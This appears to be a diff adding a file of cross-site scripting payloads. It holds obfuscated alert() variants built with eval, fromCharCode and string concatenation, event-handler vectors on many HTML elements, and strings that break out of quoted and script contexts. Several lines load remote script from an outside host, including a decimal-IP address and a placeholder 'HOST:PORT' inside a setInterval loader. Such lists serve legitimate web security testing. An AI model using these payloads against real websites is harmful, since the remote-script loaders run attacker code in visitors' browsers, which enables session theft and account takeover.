@@ -1,0 +1,49 @@
+<script>for((i)in(self))eval(i)(1337)</script>
+<script>eval(/aler/.source%2b/t(1337)/.source)</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,51,51,55,41))</script>
+<script>window[String.fromCharCode(97,108,101,114,116)]("1337")</script>
+<script>eval("ale"%2b"rt(1337)");</script>
+<script>eval('a'%2B'lert(1))</script>
+<svg/onload=%26%23097lert%26lpar;1337)>
+<script>eval('aler'.concat('t(1337)'))</script>
+<script>top["al\ert"](1337)</script>
+<svg onload=alert(1)>
+"><svg onload=alert(1)//
+"onmouseover=alert(1)//
+"autofocus/onfocus=alert(1)//
+*/</script>'>alert(1)/*<script/1='
+<script>alert(1)</script>
+<script src=javascript:alert(1)>
+<iframe src=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+<a href=javascript:alert(1)>click
+<math><brute href=javascript:alert(1)>click
+</script><svg onload=alert(1)>
+<x contenteditable onblur=alert(1)>lose focus!
+<x onclick=alert(1)>click this!
+<x oncopy=alert(1)>copy this!
+<x oncontextmenu=alert(1)>right click this!
+<x oncut=alert(1)>copy this!
+<x ondblclick=alert(1)>double click this!
+<x ondrag=alert(1)>drag this!
+<x contenteditable onfocus=alert(1)>focus this!
+<x contenteditable oninput=alert(1)>input here!
+<x contenteditable onkeydown=alert(1)>press any key!
+<x contenteditable onkeypress=alert(1)>press any key!
+<x contenteditable onkeyup=alert(1)>press any key!
+<x onmousedown=alert(1)>click this!
+<x onmousemove=alert(1)>hover this!
+<x onmouseout=alert(1)>hover this!
+<x onmouseover=alert(1)>hover this!
+<x onmouseup=alert(1)>click this!
+<x contenteditable onpaste=alert(1)>paste here!
+<script>alert(1)//
+<script>alert(1)<!--
+<script src=//brutelogic.com.br/1.js>
+<script src=//3334957647/1>
+<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>
+'onload=alert(1)><svg/1='
+'>alert(1)</script><script/1='
+*/alert(1)</script><script>/*
+*/alert(1)">'onload="/*<svg/1='
+`-alert(1)">'onload="`<svg/1='
